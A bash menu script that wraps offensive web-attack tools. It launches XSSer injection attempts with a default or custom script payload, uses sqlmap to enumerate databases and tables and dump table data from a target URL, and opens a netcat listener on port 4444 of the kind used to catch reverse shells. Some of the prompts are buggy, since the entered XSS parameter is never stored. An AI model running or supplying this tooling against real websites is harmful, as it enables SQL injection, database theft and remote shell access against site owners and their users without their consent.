#!/bin/bash

# ─────────────────────────────
# Colors
# ─────────────────────────────
RED="\e[31m"; GREEN="\e[32m"; BLUE="\e[34m"; YELLOW="\e[33m"; VIO="\e[35m"; CYAN="\e[36m"; WHITE="\e[0m"

# ─────────────────────────────
# Menu options
# ─────────────────────────────
options=(
  "XSSer"
  "XSSer with Specific Payload"
  "SQLMap list Databases"
  "SQLMap list Tables"
  "SQLMap dump Table Data"
  "netcat Listener"
  "Back"
)

pause(){
  echo -e $YELLOW
  read -rsn1 -p "Press any key to continue..."
  echo -e $WHITE
}

get_url(){
  echo -e $CYAN 
  read -e -p "Enter the url name [${target:-none}]: " input
  echo -e $WHITE
  # If user pressed Enter, keep previous; otherwise update
  if [[ -n $input ]]; then
    url=$input
  fi
}

xsser(){
  get_url
  echo -e "$YELLOW[*] Starting XSSer on $url...$WHITE"
  read -e -p "Enter the parameter to test for XSS (The Parameter Value must be 'XSS') [${param:-q}]: " input
  xsser --url $url --auto -p $param
}

xsser_specific_payload(){
  get_url
  echo -e "$YELLOW[*] Starting XSSer on $url with specific payload...$WHITE"
  read -e -p "Enter the parameter to test for XSS (The Parameter Value must be 'XSS') [${param:-q}]: " input
  echo -e $CYAN 
  read -e -p "Enter the XSS payload to use [${payload:-<script>alert(1)</script>}]: " input_payload
  echo -e $WHITE
  # If user pressed Enter, keep previous; otherwise update
  if [[ -n $input_payload ]]; then
    payload=$input_payload
  fi
  xsser --url $url -p $param --Fp "$payload"
}

sqlmap_list_dbs(){
  get_url
  echo -e "$YELLOW[*] Starting SQLMap on $url...$WHITE"
  sqlmap -u $url --batch --dbs
}

sqlmap_list_tables(){
  get_url
  echo -e "$YELLOW[*] Starting SQLMap on $url...$WHITE"
  read -e -p "Enter the database name to enumerate tables [${dbname:-none}]: " input_db
  # If user pressed Enter, keep previous; otherwise update
  if [[ -n $input_db ]]; then
    dbname=$input_db
  fi
  sqlmap -u $url --batch -D $dbname --tables
}

sqlmap_list_table_dump(){
  get_url
  echo -e "$YELLOW[*] Starting SQLMap on $url...$WHITE"
  read -e -p "Enter the database name to enumerate tables [${dbname:-none}]: " input_db
  # If user pressed Enter, keep previous; otherwise update
  if [[ -n $input_db ]]; then
    dbname=$input_db
  fi
  read -e -p "Enter the table name to dump data from [${tablename:-none}]: " input_table
  # If user pressed Enter, keep previous; otherwise update
  if [[ -n $input_table ]]; then
    tablename=$input_table
  fi
  sqlmap -u $url --batch -D $dbname -T $tablename --dump
}

netcat_listener(){
  echo -e $CYAN 
  read -e -p "Enter the port to listen on [${port:-4444}]: " input
  echo -e $WHITE
  # If user pressed Enter, keep previous; otherwise update
  if [[ -n $input ]]; then
    port=$input
  else
    port=4444
  fi
  echo -e "$YELLOW[*] Starting netcat listener on port $port...$WHITE"
  nc -lvnp $port
}

while true; do
  clear
  echo -e $VIO
  PS3="Choose an option: ";export PS3;
  select option in "${options[@]}"
  do 
    case $option in
      'XSSer')
        xsser
        break
        ;;
      'XSSer with Specific Payload')
        xsser_specific_payload
        break
        ;;
      'SQLMap list Databases')
        sqlmap_list_dbs
        break
        ;;
      'SQLMap list Tables')
        sqlmap_list_tables
        break
        ;;
      'SQLMap dump Table Data')
        sqlmap_list_table_dump
        break
        ;;
      'netcat Listener')
        netcat_listener
        break
        ;;
      Back)
        exit 0
        ;;
      *)
        echo -e "$RED Invalid Input. $WHITE"
        break
        ;;
    esac
  done
  pause
done
